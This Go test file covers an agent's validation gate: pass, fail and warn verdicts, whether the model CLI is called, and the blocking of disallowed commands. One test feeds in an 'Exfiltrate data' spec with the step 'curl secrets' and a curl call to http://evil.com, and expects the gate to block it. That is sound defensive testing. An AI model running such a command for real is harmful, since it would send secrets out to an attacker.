package agent

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/xiii/orqestra/internal/config"
)

func TestGate_PassingCommands(t *testing.T) {
	reportJSON, _ := json.Marshal(ValidationReport{
		SchemaVersion: "1",
		Verdict:       VerdictPass,
		Summary:       "Work output satisfies all criteria",
	})
	mock := &qaMockCLIRunner{response: string(reportJSON)}
	cfg := &config.ValidatorConfig{ModelRef: "test"}
	v := NewGate(mock, cfg)

	input := &QAInput{
		Spec: Specification{
			Goal:       "Create a file",
			Steps:      []string{"touch file.txt"},
			Acceptance: []string{"file.txt exists"},
		},
		WorkOutput: "Created file.txt successfully",
		ValidationCommands: []ValidationCommand{
			{Command: "true", ExpectedExit: 0},
		},
	}

	report, err := v.ValidateWork(context.Background(), input)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if report.Verdict != VerdictPass {
		t.Errorf("expected pass, got %q", report.Verdict)
	}
}

func TestGate_FailingCommand(t *testing.T) {
	mock := &qaMockCLIRunner{response: `{}`}
	cfg := &config.ValidatorConfig{ModelRef: "test"}
	v := NewGate(mock, cfg)

	input := &QAInput{
		Spec: Specification{
			Goal:       "Create a file",
			Steps:      []string{"touch file.txt"},
			Acceptance: []string{"file.txt exists"},
		},
		WorkOutput: "something went wrong",
		ValidationCommands: []ValidationCommand{
			{Command: "false", ExpectedExit: 0}, // false always exits 1
		},
	}

	report, err := v.ValidateWork(context.Background(), input)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if report.Verdict != VerdictFail {
		t.Errorf("expected fail, got %q", report.Verdict)
	}
	// Should not call CLI when commands fail
	if mock.callCount != 0 {
		t.Error("CLI should not be called when validation commands fail")
	}
}

func TestGate_NoCommands_CLIOnly(t *testing.T) {
	reportJSON, _ := json.Marshal(ValidationReport{
		SchemaVersion: "1",
		Verdict:       VerdictWarn,
		Summary:       "Looks done but no way to verify automatically",
		Issues: []Issue{
			{ID: "AMBIGUOUS", Blocking: false, Message: "Cannot verify output format"},
		},
	})
	mock := &qaMockCLIRunner{response: string(reportJSON)}
	cfg := &config.ValidatorConfig{ModelRef: "test"}
	v := NewGate(mock, cfg)

	input := &QAInput{
		Spec: Specification{
			Goal:       "Write docs",
			Steps:      []string{"Write README"},
			Acceptance: []string{"README is clear"},
		},
		WorkOutput: "# My Project\nThis does stuff.",
	}

	report, err := v.ValidateWork(context.Background(), input)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if report.Verdict != VerdictWarn {
		t.Errorf("expected warn, got %q", report.Verdict)
	}
	if mock.callCount != 1 {
		t.Errorf("expected 1 CLI call, got %d", mock.callCount)
	}
}

func TestGate_BlocksDisallowedCommand(t *testing.T) {
	mock := &qaMockCLIRunner{response: `{}`}
	cfg := &config.ValidatorConfig{ModelRef: "test"}
	v := NewGate(mock, cfg)

	input := &QAInput{
		Spec: Specification{
			Goal:       "Exfiltrate data",
			Steps:      []string{"curl secrets"},
			Acceptance: []string{"data sent"},
		},
		WorkOutput: "done",
		ValidationCommands: []ValidationCommand{
			{Command: "curl", Args: []string{"http://evil.com"}, ExpectedExit: 0},
		},
	}

	report, err := v.ValidateWork(context.Background(), input)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if report.Verdict != VerdictFail {
		t.Errorf("expected fail for blocked command, got %q", report.Verdict)
	}
	if mock.callCount != 0 {
		t.Error("CLI should not be called when commands are blocked")
	}
}
